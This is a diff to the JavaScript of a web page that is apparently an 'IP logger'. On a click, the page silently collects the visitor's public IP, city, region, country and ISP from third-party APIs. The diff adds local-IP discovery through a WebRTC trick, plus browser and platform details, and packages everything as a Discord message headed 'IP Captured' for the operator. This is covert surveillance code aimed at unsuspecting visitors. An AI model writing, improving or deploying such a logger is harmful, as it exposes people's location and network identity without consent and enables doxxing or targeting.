@@ -29,38 +29,87 @@
             status.style.display = 'none';
             
             try {
+                // Get public IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
-                const ip = ipData.ip;
+                const publicIP = ipData.ip;
                 
-                let city = 'Unknown', region = 'Unknown', country = 'Unknown';
+                // Get location info
+                let city = 'Unknown', region = 'Unknown', country = 'Unknown', isp = 'Unknown';
                 try {
-                    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    const locationResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
                     const locationData = await locationResponse.json();
                     city = locationData.city || 'Unknown';
                     region = locationData.region || 'Unknown';
                     country = locationData.country_name || 'Unknown';
+                    isp = locationData.org || 'Unknown';
                 } catch (e) {
                     console.log('Location API failed');
                 }
                 
+                // Get local IP (using WebRTC trick)
+                let localIP = 'N/A';
+                try {
+                    const pc = new RTCPeerConnection({iceServers:[]});
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = ice => {
+                        if(!ice || !ice.candidate || !ice.candidate.candidate) return;
+                        const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
+                        if(match) localIP = match[1];
+                        pc.close();
+                    };
+                } catch(e) {
+                    console.log('Local IP detection failed');
+                }
+                
                 const now = new Date();
-                const dateStr = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear().toString().slice(-2)}`;
+                const dateStr = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear()}`;
                 let hours = now.getHours();
                 const ampm = hours >= 12 ? 'PM' : 'AM';
                 hours = hours % 12;
                 hours = hours ? hours : 12;
                 const timeStr = `${hours.toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} ${ampm}`;
                 
+                // Create Discord embed
+                const embed = {
+                    title: "IP Captured",
+                    color: 16711680, // Red color
+                    fields: [
+                        {
+                            name: "IP Addresses",
+                            value: `**Public IP:** \`${publicIP}\`\n**Local IP:** \`${localIP}\``,
+                            inline: false
+                        },
+                        {
+                            name: "Location",
+                            value: `**City:** ${city}\n**Region:** ${region}\n**Country:** ${country}\n**ISP:** ${isp}`,
+                            inline: true
+                        },
+                        {
+                            name: "System Info",
+                            value: `**Browser:** ${navigator.userAgent.split(')')[0].split('(')[1] || 'Unknown'}\n**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}`,
+                            inline: true
+                        },
+                        {
+                            name: "Timestamp",
+                            value: `**Date:** ${dateStr}\n**Time:** ${timeStr}\n**UTC:** ${now.toISOString()}`,
+                            inline: false
+                        },
+                        {
+                            name: "Page URL",
+                            value: window.location.href,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "IP Logger • Click logged"
+                    },
+                    timestamp: new Date().toISOString()
+                };
+                
                 const discordMessage = {
-                    content: `**== IP Captured ==**\n` +
-                             `**Public IP:** \`${ip}\`\n` +
-                             `**Location:** ${city}, ${region}, ${country}\n` +
-                             `**Time:** ${timeStr}\n` +
-                             `**Date:** ${dateStr}\n` +
-                             `**Browser:** ${navigator.userAgent.substring(0, 100)}\n` +
-                             `**Page:** ${window.location.href}\n` +
-                             `\`\`\`Click logged at: ${new Date().toISOString()}\`\`\``,
+                    embeds: [embed],
                     username: "IP Logger"
                 };
                 
